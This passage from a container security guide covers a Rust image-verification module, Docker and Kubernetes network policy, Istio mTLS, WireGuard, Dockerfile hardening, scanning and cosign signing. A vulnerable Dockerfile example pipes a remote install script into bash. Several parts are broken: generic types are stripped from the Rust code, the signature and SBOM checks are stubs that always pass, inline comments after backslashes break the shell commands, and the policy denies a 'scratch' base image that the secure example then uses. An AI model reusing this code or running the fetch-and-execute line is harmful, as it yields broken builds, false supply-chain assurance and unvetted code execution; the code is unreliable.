                "gcr.io".to_string(),
                "registry.k8s.io".to_string(),
                "ghcr.io".to_string(),
            ],
            denied_base_images: vec![
                "scratch".to_string(),  // Ironically unsafe as it hides tooling
            ],
        }
    }
}

impl ImageVerifier {
    pub fn new(key_paths: &[&Path], policy: VerificationPolicy) -> Result {
        let mut trusted_keys = Vec::new();
        for path in key_paths {
            let key_pem = std::fs::read(path)
                .with_context(|| format!("read key {:?}", path))?;
            let key = Self::parse_verifying_key(&key_pem)?;
            trusted_keys.push(key);
        }

        Ok(Self { trusted_keys, policy })
    }

    /// Verify all aspects of an image before running
    pub async fn verify_image(&self, image_ref: &str) -> Result {
        let mut result = VerificationResult::new(image_ref.to_string());

        // 1. Validate reference format and registry policy
        self.validate_registry(image_ref)
            .context("registry validation")?;
        result.registry_allowed = true;

        // 2. Require digest in reference
        if !image_ref.contains("@sha256:") {
            if self.policy.require_signature {
                bail!("Image must be referenced by digest for signature verification. \
                       Got: {}, expected format: name@sha256:...", image_ref);
            }
        }

        // 3. Fetch and verify manifest
        let manifest = self.fetch_manifest(image_ref).await
            .context("fetch manifest")?;

        // 4. Verify manifest digest matches what's in the reference
        if let Some(expected) = extract_digest_from_ref(image_ref) {
            self.verify_manifest_digest(&manifest, &expected)?;
            result.digest_verified = true;
        }

        // 5. Verify each layer digest
        for (i, layer) in manifest.layers.iter().enumerate() {
            self.verify_layer_digest(i, layer).await
                .with_context(|| format!("layer {} digest", i))?;
        }
        result.layers_verified = true;

        // 6. Verify image signature (cosign)
        if self.policy.require_signature {
            self.verify_signature(image_ref).await
                .context("signature verification")?;
            result.signature_verified = true;
        }

        // 7. Verify SBOM if required
        if self.policy.require_sbom {
            self.verify_sbom_attestation(image_ref).await
                .context("SBOM attestation")?;
            result.sbom_verified = true;
        }

        // 8. Check image age
        if let Some(max_age) = self.policy.max_age_days {
            let image_config = self.fetch_image_config(&manifest).await?;
            self.check_image_age(&image_config, max_age)
                .context("image age check")?;
        }

        result.passed = true;
        Ok(result)
    }

    fn validate_registry(&self, image_ref: &str) -> Result {
        if self.policy.allowed_registries.is_empty() {
            return Ok(()); // No restrictions
        }

        let registry = extract_registry(image_ref)
            .unwrap_or("docker.io");

        let allowed = self.policy.allowed_registries.iter()
            .any(|allowed| {
                registry == allowed.as_str() ||
                registry.ends_with(&format!(".{}", allowed))
            });

        if !allowed {
            bail!(
                "Registry '{}' is not in the allowed list: {:?}",
                registry,
                self.policy.allowed_registries
            );
        }

        Ok(())
    }

    /// Verify manifest digest using constant-time comparison
    /// (prevents timing oracle attacks)
    fn verify_manifest_digest(
        &self,
        manifest: &[u8],
        expected_digest: &str,
    ) -> Result {
        // Validate expected_digest format first
        let expected_hex = expected_digest
            .strip_prefix("sha256:")
            .ok_or_else(|| anyhow::anyhow!(
                "Invalid digest format, must start with 'sha256:'"))?;

        if expected_hex.len() != 64 {
            bail!("Invalid SHA256 digest length: {}", expected_hex.len());
        }

        let expected_bytes = hex::decode(expected_hex)
            .context("Invalid hex in digest")?;

        // Compute actual digest
        let computed = Sha256::digest(manifest);

        // SECURE: Constant-time comparison (prevents timing attacks)
        use subtle::ConstantTimeEq;
        if computed.as_slice().ct_eq(&expected_bytes).into() {
            Ok(())
        } else {
            bail!(
                "Manifest digest mismatch! Expected sha256:{}, got sha256:{}",
                expected_hex,
                hex::encode(&computed)
            )
        }
    }

    // Stub for example - real impl uses OCI registry HTTP API
    async fn fetch_manifest(&self, _image_ref: &str) -> Result<Vec> {
        Ok(vec![]) // Placeholder
    }

    async fn verify_layer_digest(&self, _i: usize, _desc: &ImageDescriptor) -> Result {
        Ok(()) // Placeholder
    }

    async fn verify_signature(&self, _image_ref: &str) -> Result {
        Ok(()) // Placeholder - real impl uses cosign/sigstore
    }

    async fn verify_sbom_attestation(&self, _image_ref: &str) -> Result {
        Ok(()) // Placeholder
    }

    async fn fetch_image_config(&self, _manifest: &Vec) -> Result {
        Ok(ImageConfig::default()) // Placeholder
    }

    fn check_image_age(&self, config: &ImageConfig, max_age_days: u32) -> Result {
        // Check image creation time vs now
        if let Some(created) = &config.created {
            let age = chrono::Utc::now() - *created;
            if age.num_days() > max_age_days as i64 {
                bail!(
                    "Image is {} days old, exceeds max allowed {} days",
                    age.num_days(), max_age_days
                );
            }
        }
        Ok(())
    }

    fn parse_verifying_key(_pem: &[u8]) -> Result {
        Ok(VerifyingKey {}) // Placeholder
    }
}

#[derive(Debug, Default)]
pub struct ImageConfig {
    pub created: Option<chrono::DateTime>,
}

#[derive(Debug)]
pub struct VerifyingKey {}

#[derive(Debug)]
pub struct VerificationResult {
    pub image_ref: String,
    pub passed: bool,
    pub registry_allowed: bool,
    pub digest_verified: bool,
    pub layers_verified: bool,
    pub signature_verified: bool,
    pub sbom_verified: bool,
    pub provenance_verified: bool,
}

impl VerificationResult {
    fn new(image_ref: String) -> Self {
        Self {
            image_ref,
            passed: false,
            registry_allowed: false,
            digest_verified: false,
            layers_verified: false,
            signature_verified: false,
            sbom_verified: false,
            provenance_verified: false,
        }
    }
}

fn extract_digest_from_ref(image_ref: &str) -> Option {
    image_ref.split('@').nth(1).map(|s| s.to_string())
}

fn extract_registry(image_ref: &str) -> Option {
    let parts: Vec = image_ref.splitn(2, '/').collect();
    if parts.len() > 1 {
        let first = parts[0];
        if first.contains('.') || first.contains(':') || first == "localhost" {
            return Some(first);
        }
    }
    None
}

fn build_seccomp_bpf(allowed: &[libc::c_long]) -> Result<Vec> {
    // Build BPF filter program
    // This is a conceptual placeholder - production use libseccomp-rs
    Ok(vec![])
}
```

---

## 15. Container Network Security

### 15.1 Docker Networking Architecture

```
Docker Network Architecture:

Physical Host
├── eth0: 192.168.1.10 (host external interface)
│
└── docker0: 172.17.0.1/16 (Docker bridge)
    ├── [iptables MASQUERADE for outbound container traffic]
    ├── [iptables FORWARD rules for inter-container]
    │
    ├── veth0abc <──────> eth0 (container1 @ 172.17.0.2)
    │   [veth pair: one end in host NS, other in container NS]
    │
    └── veth1def <──────> eth0 (container2 @ 172.17.0.3)

Custom bridge network: my-network (172.18.0.0/16)
├── [Built-in DNS: 127.0.0.11]
├── [Automatic service discovery via /etc/hosts + embedded DNS]
│
├── veth2ghi <──────> eth0 (app-container @ 172.18.0.2)
└── veth3jkl <──────> eth0 (db-container @ 172.18.0.3)
    [inter-container communication via bridge - encrypted with WireGuard/mTLS at app layer]
```

### 15.2 iptables Rules Analysis

```bash
# Docker's iptables rules (auto-managed):
iptables -L -n -v

# IMPORTANT SECURITY RULES Docker creates:
# 1. DOCKER-USER chain: for user-defined rules (processed BEFORE Docker's)
# 2. DOCKER chain: Docker's own rules
# 3. DOCKER-ISOLATION-STAGE-1,2: Inter-network isolation

# Chain DOCKER-ISOLATION-STAGE-1 (policy RETURN)
# DROP inter-network traffic
# This prevents containers on different Docker networks from communicating

# Understanding Docker's iptables rules:
# -A FORWARD -j DOCKER-USER          <- Check user rules first
# -A FORWARD -j DOCKER-ISOLATION-STAGE-1  <- Check inter-network isolation
# -A FORWARD -o docker0 -j DOCKER     <- Check Docker-managed forwarding rules
# -A FORWARD -i docker0 ! -o docker0 -j ACCEPT  <- Allow container→external
# -A FORWARD -i docker0 -o docker0 -j ACCEPT    <- Allow inter-container (SAME network)
#
# WARNING: icc=true (default) allows all containers on same bridge to communicate!
# Set icc=false in daemon.json to drop inter-container traffic

# With icc=false:
# -A FORWARD -i docker0 -o docker0 -j DROP
# Only PUBLISHED ports accessible

# Check current iptables state:
iptables -L DOCKER-USER -n -v
iptables -L DOCKER -n -v
iptables -L DOCKER-ISOLATION-STAGE-1 -n -v

# Add custom rules in DOCKER-USER chain:
# These persist Docker daemon restarts (Docker doesn't touch DOCKER-USER)
iptables -I DOCKER-USER -i docker0 -o docker0 \
  -p tcp --dport 5432 -j DROP   # Block PostgreSQL between containers

# Rate limiting for container-exposed ports:
iptables -I DOCKER-USER -p tcp --dport 8080 \
  -m limit --limit 100/min --limit-burst 200 \
  -j ACCEPT
iptables -A DOCKER-USER -p tcp --dport 8080 -j DROP
```

### 15.3 Network Policy in Kubernetes (CNI-level)

```yaml
# NetworkPolicy: Kubernetes-native network ACL
# Implemented by CNI plugins: Calico, Cilium, Weave Net
# (Default CNI implementations like flannel do NOT enforce NetworkPolicy!)

---
# Default deny all ingress and egress for a namespace
# MUST be applied first before any allow rules
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: production
spec:
  podSelector: {}  # Matches ALL pods in namespace
  policyTypes:
    - Ingress
    - Egress
  # No ingress or egress rules = deny all

---
# Allow only what's needed: frontend → backend on port 8080
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-frontend-to-backend
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: backend
      tier: api
  policyTypes:
    - Ingress
  ingress:
    - from:
        # Only allow from pods with this label in same namespace
        - podSelector:
            matchLabels:
              app: frontend
              tier: web
        # AND only from same namespace (namespaceSelector restricts)
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: production
      ports:
        - protocol: TCP
          port: 8080

---
# Allow backend to access database on port 5432
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-backend-to-database
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: database
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: backend
      ports:
        - protocol: TCP
          port: 5432

---
# Allow egress to DNS (required for name resolution)
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-dns-egress
  namespace: production
spec:
  podSelector: {}
  policyTypes:
    - Egress
  egress:
    - ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53
      to:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: kube-system

---
# Cilium-specific: L7 network policy (application-level)
# This goes BEYOND what standard NetworkPolicy supports
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-frontend-api-v1-only
  namespace: production
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
    - fromEndpoints:
        - matchLabels:
            app: frontend
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP
          rules:
            http:
              # L7: Only allow GET requests to /api/v1/*
              # Block access to /admin, /debug, /metrics etc.
              - method: GET
                path: "^/api/v1/"
              - method: POST
                path: "^/api/v1/submit$"
```

### 15.4 Service Mesh Security: mTLS with Istio

```yaml
# Istio mTLS: automatic mutual TLS for ALL service-to-service communication
# Every pod gets an Envoy sidecar that handles TLS automatically

# Enable STRICT mTLS mode (reject plaintext)
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT  # Reject all non-mTLS connections

---
# AuthorizationPolicy: service-level access control
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: backend-authz
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  rules:
    - from:
        - source:
            # Verify client's mTLS certificate identity (SPIFFE ID)
            principals:
              - "cluster.local/ns/production/sa/frontend-service-account"
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/v1/*"]
      when:
        # Additional JWT condition (defense in depth)
        - key: request.auth.claims[iss]
          values: ["https://accounts.google.com"]

---
# Istio RequestAuthentication: JWT validation
apiVersion: security.istio.io/v1beta1
kind: RequestAuthentication
metadata:
  name: backend-jwt
  namespace: production
spec:
  selector:
    matchLabels:
      app: backend
  jwtRules:
    - issuer: "https://accounts.google.com"
      jwksUri: "https://www.googleapis.com/oauth2/v3/certs"
      # Cache JWKS for 5 minutes
      jwksCacheMaxAge: "300s"
      # Forward JWT to backend after validation
      forwardOriginalToken: true
```

### 15.5 Encrypted Container Traffic with WireGuard

```bash
# WireGuard-based pod-to-pod encryption in Kubernetes
# Used by: Cilium (--encryption=wireguard), Calico, kube-router

# Cilium with WireGuard:
helm install cilium cilium/cilium \
  --set encryption.enabled=true \
  --set encryption.type=wireguard \
  --set encryption.nodeEncryption=true

# Verify WireGuard is active:
kubectl -n kube-system exec ds/cilium -- cilium encrypt status
# Encryption: Wireguard [NodeEncryption: Enabled]
# Max Seq. Number: 0x...

# Check WireGuard interfaces on nodes:
wg show cilium_wg0
# interface: cilium_wg0
#   public key: 
#   listening port: 51871
# peer: 
#   endpoint: :51871
#   allowed ips: 

# All pod-to-pod traffic between nodes is encrypted with WireGuard
# Performance: ~line rate on modern hardware with ChaCha20-Poly1305
```

---

## 16. Image Security & Supply Chain

### 16.1 Dockerfile Security Best Practices

```dockerfile
# VULNERABLE Dockerfile
FROM ubuntu:latest          # Mutable tag - not reproducible
RUN apt-get update && apt-get install -y curl wget python3
RUN curl -fsSL https://example.com/install.sh | bash  # Arbitrary code execution!
COPY . /app                 # Copies everything including .git, secrets
RUN npm install             # Runs as root, installs from internet
WORKDIR /app
EXPOSE 80
CMD ["node", "server.js"]  # Runs as root!
```

```dockerfile
# SECURE Dockerfile - Production Grade
# Stage 1: Build
FROM golang:1.22.3-bullseye@sha256: AS builder
# ^^^^ Use digest-pinned base images (immutable)

# Create non-root build user
RUN useradd -u 65532 -r -g 0 -s /sbin/nologin nonroot

WORKDIR /build

# Copy dependency files first (better layer caching)
COPY go.mod go.sum ./
# Verify module checksums against go.sum
RUN go mod download -x && go mod verify

# Copy source code
COPY --chown=65532:0 . .

# Build with security flags
RUN CGO_ENABLED=0 \
    GOOS=linux \
    GOARCH=amd64 \
    go build \
      -trimpath \                    # Remove build paths from binary
      -ldflags="-w -s \             # Strip debug info
        -extldflags '-static'" \    # Static binary
      -tags netgo,osusergo \        # Pure Go networking
      -o /build/server \
      ./cmd/server

# Verify the binary
RUN file /build/server | grep "statically linked"
RUN /build/server --version

# Stage 2: Minimal final image
FROM scratch
# ^^^^ Scratch: absolutely minimal - just our binary

# Copy CA certificates for TLS
COPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/

# Copy passwd/group for user
COPY --from=builder /etc/passwd /etc/passwd
COPY --from=builder /etc/group /etc/group

# Copy binary from build stage (not entire build environment)
COPY --from=builder --chown=65532:0 /build/server /server

# Document what port we listen on
EXPOSE 8080/tcp

# Run as non-root user
USER 65532:0

# Explicitly set entrypoint (not CMD - harder to override accidentally)
ENTRYPOINT ["/server"]
```

### 16.2 Image Vulnerability Scanning

```bash
# Trivy: comprehensive vulnerability scanner
# Scans: OS packages, language packages (go, npm, pip), config, secrets

# Scan image before deployment
trivy image \
  --severity HIGH,CRITICAL \     # Only report HIGH and CRITICAL
  --exit-code 1 \                # Exit 1 if vulnerabilities found (CI/CD)
  --security-checks vuln,config,secret \  # Check all types
  --format sarif \               # SARIF format for GitHub/GitLab integration
  --output trivy-results.sarif \
  myregistry.io/myapp:v1.0.0@sha256:abc...

# Grype: Anchore's vulnerability scanner
grype myregistry.io/myapp:v1.0.0 \
  --only-fixed \                 # Only show fixable vulns
  --fail-on high

# Syft: SBOM generation
syft myregistry.io/myapp:v1.0.0 \
  --output spdx-json=/tmp/sbom.spdx.json

# Sign the SBOM with cosign
cosign attest \
  --predicate /tmp/sbom.spdx.json \
  --type spdxjson \
  --key cosign.key \
  myregistry.io/myapp:v1.0.0@sha256:abc...

# In-toto attestation: provenance
cosign attest \
  --predicate provenance.json \
  --type slsaprovenance \
  --key cosign.key \
  myregistry.io/myapp:v1.0.0@sha256:abc...
```

### 16.3 Image Signing with Cosign (Sigstore)

```bash
# Generate cosign key pair
cosign generate-key-pair
# Creates: cosign.key (private), cosign.pub (public)

# Or use hardware security module (production):
cosign generate-key-pair --kms gcpkms://projects/my-project/...

# Sign image after build and push
cosign sign \
  --key cosign.key \
  --tlog-upload=true \           # Upload to Rekor transparency log
  --annotations "git-commit=$(git rev-parse HEAD)" \
  --annotations "build-date=$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
  myregistry.io/myapp:v1.0.0@sha256:abc...

# Verify before deployment
cosign verify \
  --key cosign.pub \
  --annotations "git-commit=<expected-commit>" \
  myregistry.io/myapp:v1.0.0@sha256:abc...

# Keyless signing with